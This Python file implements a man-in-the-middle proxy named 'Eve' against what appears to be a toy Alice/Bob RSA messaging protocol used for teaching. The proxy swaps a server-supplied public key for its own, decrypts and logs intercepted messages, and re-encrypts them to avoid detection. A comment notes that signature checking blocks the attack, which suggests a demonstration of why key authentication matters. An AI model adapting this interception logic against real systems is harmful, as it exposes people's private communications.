import socket
import threading
import json
import logging
import argparse
import sys
from crypto_core import RSAEngine, PublicKey, PrivateKey

# Custom logging format to look like a penetration testing tool
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

class ManInTheMiddleProxy:
    """An intercepting proxy that attempts to swap RSA keys and read traffic."""
    
    def __init__(self, listen_port: int, target_host: str, target_port: int, key_size: int = 32):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        
        logging.info("EVE: Booting up MITM Proxy...")
        logging.info(f"EVE: Generating fake RSA keypair ({key_size} bits)...")
        self.fake_pub_key, self.fake_priv_key = RSAEngine.generate_keypair(key_size)
        
        # State tracking: Store the real keys we intercept
        self.stolen_real_keys: dict[str, PublicKey] = {}
        
        self.proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.proxy_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def start(self):
        """Starts the proxy server to trap incoming victim connections."""
        try:
            self.proxy_socket.bind(('0.0.0.0', self.listen_port))
            self.proxy_socket.listen(5)
            logging.warning(f"EVE: Malicious proxy listening on port {self.listen_port}")
            logging.warning(f"EVE: Forwarding traffic to real server at {self.target_host}:{self.target_port}")
            
            while True:
                victim_conn, victim_addr = self.proxy_socket.accept()
                logging.error(f"EVE: VICTIM TRAPPED! Connection from {victim_addr}")
                
                # Spin up a thread to handle this specific victim's session
                session_thread = threading.Thread(target=self._handle_victim_session, args=(victim_conn,))
                session_thread.daemon = True
                session_thread.start()
                
        except KeyboardInterrupt:
            logging.info("EVE: Shutting down proxy.")
            self.proxy_socket.close()

    def _handle_victim_session(self, victim_conn: socket.socket):
        """Connects to the real server and starts bi-directional forwarding."""
        server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server_conn.connect((self.target_host, self.target_port))
        except Exception as e:
            logging.info(f"EVE: Could not reach the real server: {e}")
            victim_conn.close()
            return

        # Thread 1: Victim -> Real Server (Intercepting Alice's requests)
        t_up = threading.Thread(target=self._intercept_client_to_server, args=(victim_conn, server_conn))
        t_up.daemon = True
        t_up.start()

        # Thread 2: Real Server -> Victim (Intercepting Server's responses)
        t_down = threading.Thread(target=self._intercept_server_to_client, args=(server_conn, victim_conn))
        t_down.daemon = True
        t_down.start()

    def _intercept_client_to_server(self, victim_conn: socket.socket, server_conn: socket.socket):
        """Monitors and manipulates data going from the Client to the Server."""
        try:
            while True:
                data = victim_conn.recv(4096)
                if not data: break
                
                packet = json.loads(data.decode('utf-8'))
                msg_type = packet.get("type")

                if msg_type == "HELLO":
                    # Alice is registering. Let's steal her real public key!
                    client_id = packet["client_id"]
                    real_pub = PublicKey(packet["public_key"][0], packet["public_key"][1])
                    self.stolen_real_keys[client_id] = real_pub
                    logging.warning(f"STEALTH: Captured {client_id}'s real public key.")

                elif msg_type == "MSG":
                    # Alice is sending a message. Let's see if we tricked her into using our fake key.
                    try:
                        secret_text = RSAEngine.decrypt_string(packet["payload"], self.fake_priv_key)
                        logging.error(f">>> SECRET INTERCEPTED ({packet['from']} to {packet['to']}): '{secret_text}' <<<")
                        
                        # Now we must re-encrypt it with the target's REAL key so the server doesn't get suspicious
                        target_id = packet["to"]
                        if target_id in self.stolen_real_keys:
                            real_target_key = self.stolen_real_keys[target_id]
                            packet["payload"] = RSAEngine.encrypt_string(secret_text, real_target_key)
                            data = json.dumps(packet).encode('utf-8')
                            logging.info("STEALTH: Re-encrypted message to maintain cover.")
                    except ValueError:
                        logging.info("EVE: Failed to decrypt. They didn't use our fake key.")

                # Forward the (potentially modified) data to the real server
                server_conn.sendall(data)
        except Exception:
            pass

    def _intercept_server_to_client(self, server_conn: socket.socket, victim_conn: socket.socket):
        """Monitors and manipulates data going from the Server back to the Client."""
        try:
            while True:
                data = server_conn.recv(4096)
                if not data: break
                
                packet = json.loads(data.decode('utf-8'))
                msg_type = packet.get("type")

                if msg_type == "RESP_KEY":
                    # The server is sending Bob's key to Alice. Time to attack!
                    target_id = packet["target_id"]
                    real_pub = PublicKey(packet["public_key"][0], packet["public_key"][1])
                    self.stolen_real_keys[target_id] = real_pub
                    logging.warning(f"STEALTH: Captured {target_id}'s real key from server.")
                    
                    # THE MITM SWAP: Inject Eve's fake key instead of Bob's real key
                    packet["public_key"] = [self.fake_pub_key.e, self.fake_pub_key.n]
                    data = json.dumps(packet).encode('utf-8')
                    logging.error(f"ATTACK: Injected Eve's fake key for {target_id}!")
                    
                    # Notice we leave the signature alone. If Secure Mode is on, Alice will check the 
                    # signature against Eve's injected key, it will fail, and the attack is blocked!

                # Forward the data to the victim
                victim_conn.sendall(data)
        except Exception:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", type=int, default=9000, help="Port for proxy to listen on")
    parser.add_argument("--target", type=int, default=8000, help="Real server port")
    parser.add_argument("--keysize", type=int, default=32, help="Fake RSA key size")
    args = parser.parse_args()

    proxy = ManInTheMiddleProxy(listen_port=args.listen, target_host="127.0.0.1", target_port=args.target, key_size=args.keysize)
    proxy.start()